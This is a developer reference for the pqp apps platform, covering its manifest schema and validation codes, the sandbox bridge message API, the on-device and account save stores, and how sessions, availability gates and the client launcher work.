# Apps

An app is a small interactive thing, like a game room, that someone starts in a text or voice channel and others join. The platform owns everything around it (launcher, card, presence line, permissions, moderation); the app itself is a sandboxed bundle that talks to the page through a narrow message API.

This page covers the part that exists so far: the manifest every app ships, its validator, the presence line, and the bridge contract.

## The manifest

Every version of every app is described by one JSON file, `manifest.json`. An author writes the source shape (no hashes); the packager hashes the bundle and writes the built shape, which the server stores as it is and never takes from a client.

Fields, in the order they appear:

| Field | Meaning |
|---|---|
| `manifestVersion` | Version of the manifest format. Always `1` for now. |
| `id` | Permanent, globally unique app id (lowercase letters, digits, hyphens, 3 to 32 characters). Never reused. Ids starting with `pqp-` belong to the first-party publisher. |
| `version` | Semantic version of this build, without `+build` metadata (two builds that differ only there would be one version to SemVer but two strings to the pin). Two builds with the same id and version must be byte-identical. |
| `publisher` | The publisher that owns the id. `pqp` is first-party. |
| `platformApi` | Version of the sandbox message API the app is written against. Only `1` exists. |
| `name`, `description` | i18n keys for the display name and the one-line launcher description. |
| `icon` | One icon id from the pqp set (`APP_ICON_IDS`). Never an upload or a URL. |
| `category` | `game`, `tool` or `emulator`. `emulator` gets extra review and is first-party only. |
| `channelTypes` | Where the app can start: `text`, `voice`, or both. |
| `players` | `min`, `max` (players above it become spectators when `spectators` is true, otherwise the join is refused) and `maxSpectators` (default 50). |
| `requires` | Permission to start (`USE_APPS` or `MANAGE_CHANNELS`) and to join (`VIEW_CHANNEL` or `CONNECT`). |
| `capabilities` | What the app asks of the platform, shown in the join sheet. See below. |
| `hostBound` | When true the session's truth lives on the host's machine, so it ends after the host-gone grace instead of passing the host role on. |
| `state` | `maxBytes` of shared session state (0 to 16384), `maxWritesPerSecond` (1 to 10, default 10) and `writers` (`host` or `participants`, default `participants`). |
| `events` | Ephemeral relay limits per participant: `maxPerSecond` (0 to 20) and `maxBytes` (0 to 1024). |
| `presence` | i18n keys of the status line for someone in the app: `phrase` (has one `{name}`) and `short` (no placeholder). |
| `content` | `userText` and `userImages`: whether participants put content in the app that other people see. Drives the community lock. |
| `notice` | Optional i18n key of one line shown in the join sheet. |
| `entry` | `path` of the entry HTML in the bundle, plus `sha256` in the built shape. |
| `assets` | Optional big files the page hands to the sandbox on request: `name`, `path`, and in the built shape `sha256` and `bytes`. |
| `sandbox` | Optional narrow knobs over the fixed CSP: `wasm` (adds `wasm-unsafe-eval`), `blobWorkers` (adds `worker-src blob:`; not needed by Locadora, kept for apps that run their own workers, reviewed) and `localBlobs` (adds `connect-src blob:` only, never the network). There is no free-text CSP and no network knob. |
| `platforms` | Where it runs: `web`, `desktop`, `ios`, `android`. Default `web` and `desktop`. |
| `license` | `spdx` expression, `source` URL (https) and an optional `notices` path. |
| `store` | Optional listing fields: `summary`, `screenshots` (path, alt, and a hash in the built shape), `homepage`, `support`. |
| `i18n` | Strings for `pt-BR`, `en` and `es`, all three required. Plain text, 240 characters at most per value. |

Capabilities:

| Capability | Values |
|---|---|
| `identity` | `display` (name, avatar and a random per-session seat id) or `user-id` (also a stable per-app derived id, only for people who consent). |
| `share` | `none`, or `pane` to let the host screen-share the app pane (voice channels only). |
| `localFiles` | `allowed`, and when allowed the `accept` extensions and a `maxBytes`. The page opens the picker and reads the bytes; the file name never crosses and nothing is uploaded. |
| `deviceStore` | Optional (absent is not allowed): `{ allowed, maxBytes }`, `maxBytes` required when allowed and forbidden when not, at most 1 GiB. The app may keep named blobs on the person's own device through `store.*` (see "The device store"). The join sheet says "Guarda coisas neste aparelho", and because the server compares capabilities, a person who accepted an earlier version is asked again. |
| `peer` | `none` or `datachannel`. Only `none` is accepted on `platformApi` 1. |

## Rules beyond the schema

`validateAppManifest` runs the schema and then these rules. Each failure has a stable `code` and a `path`.

| Code | Rule |
|---|---|
| `players-range` | `players.max` is at least `players.min`. |
| `i18n-missing-key` | Every referenced key (name, description, notice, both presence keys, store summary, screenshot alt) exists in pt-BR, en and es. |
| `presence-placeholder` | `presence.phrase` has exactly one `{name}` and no other braces, in every locale. |
| `presence-short-placeholder` | `presence.short` has no `{`, in every locale. |
| `em-dash` | No i18n value contains an em dash. |
| `pt-br-voce` | No pt-BR value uses the word "você" or "voce" (pqp speaks "tu"). |
| `publisher-reserved-id` | An id starting with `pqp-` requires publisher `pqp`. |
| `publisher-emulator` | Category `emulator` requires publisher `pqp`. |
| `peer-unsupported` | `capabilities.peer` is `none` while `platformApi` is 1. |
| `local-files-accept-required`, `local-files-max-bytes-required` | When `localFiles.allowed` is true, `accept` and `maxBytes` are present. |
| `device-store-max-bytes-required`, `device-store-unexpected` | `deviceStore.maxBytes` is present when `deviceStore.allowed` is true and absent when it is false. |
| `local-files-unexpected` | When it is false, they are absent. |
| `share-needs-voice` | `share: "pane"` requires `voice` in `channelTypes`. |
| `state-writers-no-state` | `state.writers: "host"` with `state.maxBytes: 0` has nothing to write. |

Schema failures use `schema-unknown-key`, `schema-required`, `schema-type`, `schema-enum`, `schema-format`, `schema-range` and `schema-unique`.

## The presence line

`formatAppPresence(template, displayName)` puts a person's name into the app's translated phrase ("Raf tá na Locadora"). The name is untrusted text a stranger typed, so control characters and bidi override and isolate characters are removed, it is trimmed and capped at 32 characters, and the substitution is a plain splice: `$&` stays literal and a name containing `{name}` is not expanded. An empty name becomes `?`. `resolveAppPresence(manifest, locale, displayName)` picks the locale (exact, then base language, then English) and returns the `phrase` for places where the line stands alone and the `short` for places under a name that is already shown.

## The bridge

The bridge is the message API (v1, `APP_PLATFORM_API = 1`) between the pqp page, the host, and a sandboxed app frame. The app is untrusted. Contract: `packages/shared/src/apps/bridge.ts`. The WebSocket frames between the pqp client and the API are in `packages/shared/src/apps/frames.ts`, listed in the chat unions as the session engine ships them (see "Sessions").

### Handshake

Two messages travel on `window.postMessage`, nothing else does:

1. The app posts `{ pqp: "app-hello", platformApi: 1 }` to its parent.
2. The host answers `{ pqp: "app-port", platformApi: 1 }` and transfers one end of a `MessageChannel`.

The frame is an opaque origin, so there is no origin to compare. The host checks `event.source === iframe.contentWindow` and ignores every other message. The app checks that the port message came from `window.parent`. Everything after that is on the port.

**Strict toward the less trusted side, tolerant toward a newer peer.** Messages from the app (`app-hello`, every request) and client to server frames are strict: an unknown key is a rejection. Messages to the app (`app-port`, responses, pushes) and server to client frames use zod's default strip: an unknown key is dropped, never passed through. A field added later therefore does not make an app pinned to platform API 1, or an older client, reject the whole message, and a stripped key can never reach the app.

### App to host (requests, `{ id, type, ...params }`, `id` 1 to 32 characters)

- `participants.get`: the current participant list.
- `state.get`: the session state and its revision.
- `state.patch { patch, baseRev? }`: a JSON Merge Patch (RFC 7396) over the state. `baseRev` makes it conditional.
- `events.send { name, data }`: an ephemeral event for the others. `name` matches `/^[a-z][a-z0-9.-]{0,31}$/`.
- `assets.get { name }`: the bytes of one of the manifest's `assets[]`, checked by the host.
- `files.pickLocal`: the host opens the picker (the manifest decides accept list and size cap) and transfers the bytes. The file name never crosses: the answer is `{ bytes, ext }`, where `ext` is the lower-cased extension with its dot, taken from the manifest's accept list.
- `files.saveLocal { bytes, ext }`: the host hands the person a file (a download) and answers `null`. `ext` has to be on the platform's closed list (`APP_SAVE_LOCAL_EXTENSIONS`, today only `.locadora`) AND in the manifest's `localFiles.accept`, the bytes at most `localFiles.maxBytes`; otherwise `not-allowed`, `invalid` (empty) or `too-large`. The name of the file is the host's (`<app id>-<date>.<ext>`), never the app's. Three at once, then one every five seconds.
- `store.get { key }`, `store.put { key, bytes, meta? }`, `store.delete { key }`, `store.list { prefix }`, `store.usage`: the device store, below.
- `sync.status`, `sync.list { game }`, `sync.get { save }`, `sync.put { game, kind, slot, baseRev, bytes, thumb?, platform, core, coreVersion }`, `sync.delete { save }`, `sync.restore { save, baseRev }`, `sync.clear { game? }`: Saves na conta, Locadora only, below.
- `ui.resize { height }`: 120 to 2000 pixels.
- `ui.fullscreen { on }`
- `share.request { on }`: share the app pane through pqp's own flow (apps whose manifest allows it).
- `session.end`: host only.

### The device store

`capabilities.deviceStore` lets an app keep named blobs on the person's own device (Locadora: ROMs it was handed, battery saves, save states, thumbnails, preferences). `platformApi` stays 1 because the requests are additive: an older host does not know them and answers `invalid` (the request union is strict), a current host answers `not-allowed` to an app that did not declare the capability, so an app falls back to memory on either.

| Request | Params | Result |
|---|---|---|
| `store.get` | `{ key }` | `{ bytes, meta } \| null` (bytes transferred; `meta` is `null` when none was stored) |
| `store.put` | `{ key, bytes, meta? }` | `{ usage }`, `too-large` when the value or the store with it would pass the cap |
| `store.delete` | `{ key }` | `null` |
| `store.list` | `{ prefix }` | `[{ key, size, meta, updatedAt }]`, by key, at most 500, no bytes |
| `store.usage` | none | `{ used, cap, persisted }` |

`usage` is `{ used, cap, persisted }` in every answer that carries it: `cap` is the manifest's `deviceStore.maxBytes`, `persisted` is whether the browser promised not to evict the store. Keys match `^[a-z0-9:._-]{1,128}$` (a `prefix` the same alphabet, 0 to 128 characters), `meta` is JSON of at most 2048 bytes, a value is an `ArrayBuffer` of at most 64 MiB whatever the cap. Locadora's keys: `rom:<sha>`, `meta:<sha>`, `sram:<sha>`, `state:<sha>:<slot>`, `thumb:<sha>:<slot>`, `art:<sha>`, `prefs`, `seen:onboarding`.

**Where it lives and who can reach it.** The host's own IndexedDB database `pqp-app-store`, ONE OBJECT STORE PER APP ID (`client/src/lib/apps/device-store.ts`). The store is opened with the id of the manifest the frame was loaded from and the manifest's cap; no message carries an app id or a store name (a request with an extra key is `invalid`), so app A cannot name app B's keys, and nothing in the database is read by pqp's own code or sent anywhere. Inside a store each key is two records (`v:<key>` the bytes, `m:<key>` size, meta and time), so a listing or the quota sum never loads a value. The cap is summed over the store at every put (a replaced value is not counted twice); puts of one store run one at a time, so two in flight cannot both fit; two tabs can race by at most one value, and the browser's own quota still applies (a refusal for room is `too-large`). `navigator.storage.persist()` is asked once, after the first put, not awaited. All five calls share one token bucket (30 a second, burst 60) because a read moves up to 64 MiB. A browser with no IndexedDB answers `unavailable`.

SDK: `app.store.get/put/delete/list/usage` and `app.files.saveLocal(bytes, ext)` in `@pqp/app-sdk` (`put` and `saveLocal` take an `ArrayBuffer` or a view and send a copy; the caller's buffer is not detached).

### Saves na conta (`sync.*`, Locadora only)

Behind the runtime flag `locadora_save_sync` (per server, default off), and only for `pqp-locadora`: a battery save or a save state, and its picture, kept on the person's account so the same game on another device finds it (`docs/EMULATOR_ROOM.md`, "Saves na conta", which also says what the server learns and the honest limits). It is not a manifest capability: the routes are Locadora's own, so the host answers `not-allowed` to every other app without a request leaving the page, and to a spectator. For Locadora it asks the API, with the session id of the host's own seat (no message names one); a 404 there (the flag off, no storage, no player seat) is `not-allowed` too, so an app that gets it keeps everything on the device and says nothing about an account.

| Request | Params | Result |
|---|---|---|
| `sync.status` | none | `{ mode, used, cap, device }`: `mode` is `on` or `read-only` (the flag went off; for 30 days the saves can still come back and be deleted), `device` is `computer`, `phone` or `tablet` |
| `sync.list` | `{ game }` | `{ entries: [{ id, kind, slot, rev, size, hash, savedAt, device, thisDevice, thumb, platform, core, coreVersion, history }] }` |
| `sync.get` | `{ save }` | `{ rev, bytes, thumb }` (transferred) |
| `sync.put` | `{ game, kind, slot, baseRev, bytes, thumb?, platform, core, coreVersion }` | `{ id, rev, used, cap }`, `stale-rev` when the account holds a newer rev, `too-large` past a cap or the quota |
| `sync.delete` | `{ save }` | `{ used, cap }` |
| `sync.restore` | `{ save, baseRev }` | `{ id, rev }`: the newest of the three older battery saves comes back |
| `sync.clear` | `{ game? }` | `{ deleted, used, cap }`: one game's saves, or every one |

`game` is the SHA-256 (hex) of the game file the app holds. It stays on the page: the host turns it into `HMAC-SHA256(salt, hash)` with the account's salt before it talks to the API, so the server never sees it. `kind` is `sram` (slot 0) or `state` (0 the autosave, 1 to 4 the manual slots); `bytes` at most 1 MiB (a battery save 256 KiB on the server), `thumb` at most 16 KiB. The save is named `save` and never `id`, which is the request's own. The bytes go to the bucket and back with presigned URLs, never through the API. Five calls a second (burst 20) on the page; the server has its own 30 writes a minute per account and 8 MB.

SDK: `connectWithSync()` (the same handshake as `connect()`, plus the port's `sync.*` calls) and `createSyncApi(client)`, in `packages/app-sdk/src/sync.ts`. A module of its own on purpose: every app's bundle carries `connect` and `createApp`, a released app's bytes may not change under its version, and an app that never imports this file builds byte for byte as before. Folding it into `PqpApp` waits for the next SDK change that bumps every app anyway.

The routes (`server/src/api/locadora-save-routes.ts`, all 404 unless the caller holds a player seat in a live Locadora session whose server has `apps`, `emulator_room` and `locadora_save_sync` on, and `S3_*` is set): `GET /api/apps/pqp-locadora/saves/status?sessionId=`, `GET .../saves?sessionId=&gameKey=`, `POST .../saves/upload` (presigned PUTs, 409 `stale_rev` with the row that is there, 413 `quota`), `POST .../saves/uploads/:uploadId/commit` (HEAD check, rev + 1), `GET .../saves/:saveId/download?sessionId=`, `POST .../saves/:saveId/restore`, `DELETE .../saves/:saveId?sessionId=`, `DELETE .../saves?sessionId=[&gameKey=]`. Contract: `packages/shared/src/apps/locadora-saves.ts`. The config entry carries `saveSync` (true only for Locadora where the flag is on), and the join sheet then says "Guarda teus saves na tua conta" and stops saying the saves stay only on the device.

### Host to app

Responses carry the request `id`, and a successful one also echoes the request `type`, so its `result` is read as the answer to that call and never guessed from its shape. A call with nothing to return (`events.send`, `session.end`) answers `result: null`: `{ id, ok: true, result }` or `{ id, ok: false, error }`, with `error` one of `not-allowed`, `not-host`, `too-large`, `rate-limited`, `stale-rev`, `cancelled`, `unavailable`, `ended`, `invalid`.

Pushes have no id:

- `hello`: platform version, app id and version, locale, theme, reduced motion, `self` (seat, role, host), connection. Sent once after the port is handed over.
- `participants`: seat id, display name, avatar as a data URL (or null), role, host flag, `connection` (`present`, or `reconnecting` while the seat is held for its 90 second resume window), and `appUserId` only for people who consented. The same `connection` field is on the participants of `participants.get`, of the `app-session` frame and of the `channel-app` summary.
- `state { rev, value }`
- `event { fromSeatId, name, data }`
- `connection { status }`: `online` or `reconnecting`.
- `session.ended { reason }`: one of the `end_reason` values of the data model.
- `theme { theme }`: up to 64 CSS custom properties.

### Caps

| What | Cap |
|---|---|
| State patch and state value | 16384 bytes serialized (`APP_STATE_MAX_BYTES`) |
| Event payload | 1024 bytes serialized (`APP_EVENT_MAX_BYTES`) |
| Events per participant | 20 per second (`APP_EVENT_MAX_PER_SECOND`) |
| State writes per session | 10 per second, coalesced (`APP_STATE_MAX_WRITES_PER_SECOND`) |
| JSON nesting | 32 levels |
| Participants in one push | 264 |
| Avatar data URL | 65536 characters |
| Avatars in one participant list | 4 MiB of characters in total (`APP_PARTICIPANTS_AVATAR_BUDGET_CHARS`); the host downsizes avatars until the list fits |
| Display name | 64 characters |

JSON values must survive `JSON.stringify` unchanged: no `undefined`, functions, `NaN`, `Infinity`, class instances or holes in arrays. Sizes are UTF-8 bytes of the serialized value, enforced by the schemas themselves.

### What the app never sees

A pqp user id, an email, a token, a server id or a channel id. It gets a display name, an avatar as a data URL, a random per-session seat id (16 to 32 characters of `A-Za-z0-9_-`), and, for people who ticked the consent box only, a per-app derived id. `bridge.test.ts` walks every bridge schema and fails if a key named `userId`, `user_id`, `email`, `token`, `serverId` or `channelId` appears on it. The WebSocket frames may carry user ids, because the page needs them to draw avatars; the page strips them before anything reaches the app.

## Writing an app

An app is a small web bundle that runs in a sandboxed frame (no network, no storage, an opaque origin) and talks to the pqp page through `@pqp/app-sdk`. The SDK has no runtime dependencies and does the handshake for you.

```ts
import { applyTheme, connect, PqpAppError } from "@pqp/app-sdk";

const app = await connect(); // app-hello / app-port, then the host's hello
applyTheme(app.hello.theme);
app.on("theme", applyTheme);

const label = document.querySelector("#count")!;
const render = ({ value }: { value: unknown }) => {
  label.textContent = String((value as { count?: number } | null)?.count ?? 0);
};
app.state.on(render); // register right after connect...
render(await app.state.get()); // ...and read the current value with get()

document.querySelector("#plus")!.addEventListener("click", async () => {
  const { rev, value } = await app.state.get();
  try {
    await app.state.patch({ count: ((value as { count?: number } | null)?.count ?? 0) + 1 }, { baseRev: rev });
  } catch (error) {
    if (!(error instanceof PqpAppError) || error.code !== "stale-rev") throw error; // somebody was faster: ignore
  }
});
app.events.on("ping", ({ data }) => console.log("ping from", data));
await app.events.send("ping", { hello: true });
```

What to know:

- `connect()` resolves with the app once the host's `hello` arrived (`app.hello`: platform version, app id and version, locale, theme, `self`). It rejects with `unavailable` when pqp does not answer in 15 seconds, and at once when the page is not inside a pqp frame. Call it once; a second call returns the same promise.
- Listeners (`participants.on`, `state.on`, `events.on(name, cb)`, `app.on("connection" | "theme" | "ended", cb)`) return an unsubscribe function. Register them right after `connect()` and use the `get` calls for the value from before. A push that arrives before a listener exists is not replayed.
- Every call returns a promise and rejects with a `PqpAppError` whose `code` is one of the bridge's codes (`not-allowed`, `not-host`, `too-large`, `rate-limited`, `stale-rev`, `cancelled`, `unavailable`, `ended`, `invalid`). A call the host does not answer within 15 seconds rejects with `unavailable`. After `ended` every call rejects with `ended`. A success the host sends must echo the request's `type` and carry the fields of its call (`events.send` and `end` answer `result: null`); a reply that names another call, omits the type or has a field of the wrong kind rejects with `unavailable`, so a write never looks done on the strength of someone else's answer.
- `events.send` and `end` resolve to `null`. `files.pickLocal()` resolves to `{ bytes, ext }`, or `null` when the person cancels. `assets.get(name)` resolves to an `ArrayBuffer` the host already checked against the manifest's hash.
- The app sees seat ids, display names and avatar data URLs, never pqp user ids. State is a JSON Merge Patch over one JSON value of at most 16 KB, events are at most 1 KB, and the manifest can lower both caps.
- Theme: the host sends up to 64 CSS custom properties. `applyTheme(theme)` writes them on the document element through the CSSOM, which the frame's `style-src 'self'` allows.

## Availability

An app may run in a place only when every gate holds. `appAvailability(serverId, appId, { channelType })` in `server/src/apps/availability.ts` answers `{ available, reason }`, and `reason` is the FIRST gate that fails, in this order:

| Reason | Gate |
|---|---|
| `flag-off` | The runtime flag `apps` is off for the server. |
| `not-live` | `apps.status` is not `live`, or the app has no current version. |
| `global-off` | `apps.global_enabled` (the operator's master switch) is off. |
| `not-allowed-here` | `server_apps.operator_enabled` is not TRUE for this server. |
| `owner-off` | The server's owner set `server_apps.owner_enabled` to FALSE. The owner can only remove what the operator allowed. |
| `community-locked` | The server is a public community (`servers.is_community`) and the app has no `community_unlocked` safety decision. |
| `emulator-off` | `category: "emulator"` also needs the flag `emulator_room` on the server. |
| `channel-type` | The channel's type (`text` or `voice`) is not in the manifest's `channelTypes`. |
| `no-origin` | The deployment has no `APPS_ORIGIN`, so no app can run. |

D14: `appShareAllowed(serverId, app)` is true for every app except `category: "emulator"`, which also needs the flag `locadora_share` on the server (per server, default off, waiting for the lawyer's answer). The config carries it as `shareAllowed` and the session engine refuses `share.request` and spectator joins without it.

### The apps origin

`APPS_ORIGIN` names the separate, cookieless site that serves bundles (hosted: `https://pqp-apps.pages.dev`, local: `http://localhost:5175`). Unset, the config answers `origin: null` and every app is `no-origin`. Bundle addresses are `<origin>/<id>/<version>/<path>`, built by the server from the stored manifest, never from a request.

### The catalog

`server/src/apps/catalog.json` (`{ "apps": [ { "manifest": <built manifest>, "manifestSha256": "<hex>" } ] }`, written by the packager) is merged into `apps` and `app_versions` at boot by `loadAppCatalog`, on the API and the worker. The merge is insert-only: a new app arrives as `draft`, off everywhere, and a new version as `pending` review; the same (id, version) with a different `manifestSha256` is refused with a loud log; nothing ever changes the status, switches, review fields or `current_version` of an existing row, except that an app with no `current_version` gets the newest version the load inserted. Every insert writes an `app_admin_audit` row (`catalog-load`). The build copies the file into `dist/apps/`.

On a dev box only (`DEV_AUTH_BYPASS=true` and `NODE_ENV` not `production`) apps of the `pqp` publisher are made `live`, `global_enabled` and `community_unlocked` at load, and the dev seed releases them on its Sandbox server, so a local checkout needs no dashboard. Turn the platform itself on with `APPS=true` in `.env`, and set `APPS_ORIGIN`.

### The config route

`GET /api/apps/config?serverId=` (member of the server, otherwise 404) answers `{ enabled, origin, apps }`, typed by `appsConfigSchema` in `packages/shared/src/apps/config.ts`. With the flag off, or with no `serverId`, it is `{ enabled: false, origin: null, apps: [] }`. Each `live` app is listed with `available` and `reason`, the entry and asset URLs, `shareAllowed`, and only the i18n keys a client draws (name, description, notice, presence) in all three locales.

### Who may start

`USE_APPS` is on `@everyone` of every server created from now on (`PERMISSION_NEW_SERVER_EVERYONE`), and on the moderator, manager and admin staff roles, which is what a new server is seeded with. It is not in `PERMISSION_DEFAULT_EVERYONE`, so a community only has it when its owner grants it.

## Sessions

One live session per channel, decided by the partial unique index `idx_app_sessions_one_live_per_channel`. Code: `server/src/apps/sessions.ts` (start, end), `server/src/apps/summary.ts` (the summary read from the rows), `server/src/ws/apps.ts` (fan-out), routes in `server/src/api/app-routes.ts`. Everything is behind the `apps` flag: with it off for the server, every route below answers 404 and no frame is sent.

| Route | Answers |
|---|---|
| `POST /api/channels/:channelId/app-sessions` `{ appId }` | 201 with an `AppSessionSummary`. 404 channel unknown, not a server channel, not viewable, or flag off. 403 `app_unavailable` with `reason` (see Availability). 403 `cannot_start`. 409 `session_live` with `session`, the live one. 429 `rate_limited`. |
| `GET /api/channels/:channelId/app-session` | The channel's `AppSessionSummary`, or `null`. |
| `POST /api/app-sessions/:sessionId/end` | 200 `{ ended }`: `false` when it was already over. 403 `cannot_end`. |
| `GET /api/servers/:serverId/app-sessions` | `{ sessions: [{ channelId, session }] }` for every channel of the server the caller can VIEW. The client asks on server open and on socket reconnect; the `/ws` welcome carries none of it. |

A start checks, in order: the channel exists and the person can VIEW it; the flag; the app is available for the channel's type; the person holds the manifest's `requires.start` in THIS channel (USE_APPS always, so channel overwrites apply; `MANAGE_CHANNELS` on top when the manifest says so); no live session. In one transaction it inserts the session (`server_id` from the channel row, never from the request; the version pinned to `apps.current_version` at that instant) and a system message (`system_kind = 'app_session'`, body `<name> começou um app` for clients that do not know the kind), links it as `timeline_message_id`, and after the commit tells the channel (`message-broadcast`, then `channel-app`). The starter is host and is not joined.

An end (`endSessionRow`) sets `status = 'ended'`, `end_reason`, `ended_by`, clears the state to `{}`, writes `summary = { participants, durationSeconds }` and stamps everyone still seated as left. Who may end: the host (`host`), someone with MANAGE_CHANNELS in the channel (`moderator`), an instance moderator (`operator`); the system ends with the other reasons. Ending a session that is over is a 200 no-op that tells nobody.

Frames: `channel-app` `{ channelId, session: AppSessionSummary | null }` goes to every socket whose account can VIEW the channel (decision D13), on every instance, not only to sockets looking at the channel. A start and an end are sent at once and are never dropped; changes to a count are coalesced to one summary per 250 ms per channel. `app-ended` (reason and summary) goes to the sockets seated in the session AND to every other socket whose account can VIEW the channel, so the card on everybody's timeline turns into the quiet record. An app that leaves a small JSON object in `state.result` (a closed vote's tally, at most 512 compact bytes) has it copied into `summary.result` when the session ends, before the state is cleared; anything else is dropped. The timeline card is a message with `systemKind: "app_session"` and, on every read path (history, around, the single read, the live fan-out of the card), `appSession: { id, appId, appVersion, status, endReason, summary, startedBy }` joined through `app_sessions.timeline_message_id`, `null` once the session was retained away; search hits are snippets and carry no message payload. Row first, bus hint second: the bus carries only "this channel changed" and each instance reads the rows for its own sockets.

### Taking part: join, leave, state, events

The client frames (all strict, listed in `chatClientMessageSchema`): `app-join { sessionId, asSpectator? }`, `app-leave { sessionId }`, `app-state-patch { sessionId, baseRev?, patch }`, `app-event-send { sessionId, name, data }`. The server answers with `app-session`, `app-state`, `app-event`, `app-ended` and `app-error { sessionId, op, code }` (`full`, `not-allowed`, `ended`, `rate-limited`, `too-large`, `stale-rev`, `unavailable`). With the flag off for the session's server, or for a session that does not exist, a client frame is answered with nothing at all. The same holds for a frame from a socket that is not seated in the session (an `app-state-patch` or `app-event-send` after an end, or before a join): it is counted as dropped and answered with nothing, because with no seat there is no session on this process to read the flag from. Code: `server/src/ws/apps.ts` (handlers and fan-out), `server/src/apps/participants.ts` (the rows), `server/src/apps/state.ts` (the shared state).

- **Joining** (D13): VIEW_CHANNEL, plus CONNECT in a voice channel; a manifest's `requires.join: "CONNECT"` raises a text channel to the same. A person who may not is refused `not-allowed`. Over `players.max` the person is seated as a spectator if the app allows it and `maxSpectators` has room, else `full`; `asSpectator` asks for it with room to spare. D14: an `emulator` app admits spectators only where `locadora_share` is on (`not-allowed` for an explicit request, `full` when the seat was only a spillover). A person under a timeout is seated as a spectator, who writes and sends nothing. Joining takes the session row's lock, so two machines taking the last place give it to one of them.
- **Seats**: one row per person per session, however many tabs. The seat id is 22 random base64url characters and is the only identifier the app sees. A person already seated resumes the same seat id and role. `connection` is `reconnecting` while the seat is held.
- **The hold**: a socket closing with no other socket of that person seated holds the seat for 90 s (`orphaned_at`); `app-leave` releases it at once (`left_at`), and coming back after a leave keeps the seat id but not the place in line. Every 15 s each process sweeps ONLY the rows it owns (`instance_id`): a ghost (no socket in its map) is held, a held seat past 90 s is released. A close on a machine that no longer owns the row changes nothing, and a person whose seat another machine stamped as held while they still have a socket here takes it back at the next roster. Rows of a dead instance are not touched here (that is the global sweep, behind `otherLeasesTrustworthy`). A close can arrive while the same socket's `app-join` is still in flight (the close handler is not on the frame chain): `handleJoin` checks the socket (closed flag or `readyState !== 1`) before it writes the seat and again right after, with no await before registering it; a socket that is gone is never registered, and a seat already written for it is held like any other close (unless the person has another socket seated here). The roster also treats a gone socket as no evidence: it releases it through the close path, never lets it take a held seat back, holds the seat again if the socket dies while the reclaim write is in flight, and reads who is live from the sockets that remain, so one dying tab never erases another tab's evidence.
- **Roster**: every seated socket gets `app-session` again when anyone joins, leaves, is held or returns (coalesced to 250 ms), and the channel's viewers a fresh `channel-app`. The snapshot carries the state with its revision: a client applies the state in it only when `rev` is at least the one it holds.
- **State** (`app-state-patch`): JSON Merge Patch (RFC 7396) applied to the parsed state under the row's lock, `state_rev` bumped by one per write, the whole value broadcast as `app-state` (row first, bus hint second: the other machine reads the row). Writers: the manifest's `state.writers` (`host`, or `participants`, meaning players and the host, never spectators). `baseRev` is a compare-and-set (`stale-rev`) and is written alone and at once or refused as `rate-limited`. The cap is the manifest's `state.maxBytes` (at most 16 KB) on the compact `JSON.stringify` bytes of the merged parsed value, never the text the client sent. A string with U+0000 is refused (jsonb cannot store it). A session takes at most `state.maxWritesPerSecond` writes a second from one machine: patches arriving inside the window are applied one after the other in ONE write and one revision bump, so the last value wins and nothing composes inexactly. A patch that changes nothing writes nothing.
- **Events** (`app-event-send`): relayed as `app-event { fromSeatId, name, data }` to the other seats on every machine, never stored and never logged (only counters). Per participant, at most `events.maxPerSecond` a second (a token bucket) and `events.maxBytes` per event; the sender hears `rate-limited` at most once a second. Spectators send none.
- **Frame budget**: `app-state-patch` and `app-event-send` draw from their own bucket in `ws/frame-budget.ts` (120 burst, 40 a second), so a well-behaved game is not hung up by the 20 a second chat budget; joins and leaves stay on the general one.

## In the client

Nothing here draws or requests anything while `GET /api/apps/config?serverId=` answers `enabled: false`, or has not answered yet (`hooks/use-apps-config.ts`, re-asked by `lib/config-refresh.ts` like the other feature configs).

- **The live store** (`client/src/lib/apps/app-sessions-store.ts`) is the one source of truth for "an app is running in this channel": the card, the strip and the presence line all read it. It is fed by `GET /api/servers/:id/app-sessions` on server open and after every reconnect (`hooks/use-apps-sessions-sync.ts`, jittered like the other reconnect reads) and by the `channel-app` and `app-ended` frames. `handleAppsFrame` is the one door for every apps frame (`channel-app`, `app-ended`, `app-session`, `app-error`, and `app-state` / `app-event`, which it swallows because nothing draws them yet); `App.tsx` calls it before any other stop for those types, since `app-session` and `app-error` are what end a join. A frame that lands while a read is in flight wins over that read, so a slow answer cannot bring back a session that ended meanwhile.
- **The timeline card** (`components/apps/app-session-card.tsx`, wired by `app-session-timeline-row.tsx` from `message-list.tsx`) draws a message of kind `app_session`. The message carries its session (`message.appSession`: id, app, status, how it ended, the quiet record's summary), so the card finds its live session in the store by that id and needs no guessing. `lib/apps/card-model.ts` decides which of the states (open, inside, full, reconnecting, host left, ended, switched off, unknown) a card is in from data alone.
- **An ended session** reads what this tab heard first (`app-ended` now reaches every viewer of the channel, with the reason and the summary), then what the message itself carries. A message that still says `live` while the store has nothing running is a session that ended while this tab was not looking: "Terminou." with the app's name and no count. `appSession: null` is a session the server has retained away: the generic "Terminou." with who started it. The summary's `result` (an app's small JSON object, at most 512 bytes) travels with the card model. The convention for every app: one that wants a closing line on the card writes `state.result = { text: "..." }` before ending; the card draws that string as plain text, on one line, at most 200 characters, under the summary, and ignores any other shape.
- **The launcher** (`components/apps/app-launcher.tsx`, placed in the composer by `message-composer.tsx`'s `appsLauncher` slot, built in `App.tsx`) is a popover on a desktop and a modal sheet on a phone. Everyone sees the button once apps are released (an app running here turns it into Entrar for them); with none released only whoever holds MANAGE_SERVER sees it, for the empty panel. A tile that cannot start here stays on screen with its reason written (`lib/apps/launcher-model.ts`: the channel type first, then the server's gate from the config). Música and watch party are shortcuts into what already exists, not apps. Starting calls `POST /api/channels/:id/app-sessions`, closes on success and joins at once (the starter is host and not seated); the permission it asks for comes from the config entry's `requires.start` (USE_APPS always, and MANAGE_CHANNELS on top when the manifest says so), so an app the person cannot start says so before the click. One start request exists per channel at a time: a start that outlives eight seconds reads as a failure, and "Tentar de novo" waits for that same request instead of sending another; its late answer is adopted wherever the panel is by then (the session goes into the store and the starter joins it).
- **Joining** goes through `requestAppJoin(sessionId, options)`: whoever registered with `registerAppJoinInterceptor` (the join sheet) first, otherwise `joinAppSession`, which sends `app-join` through the transport the shell registered and waits for the summary to seat the viewer, an `app-error`, or eight seconds.
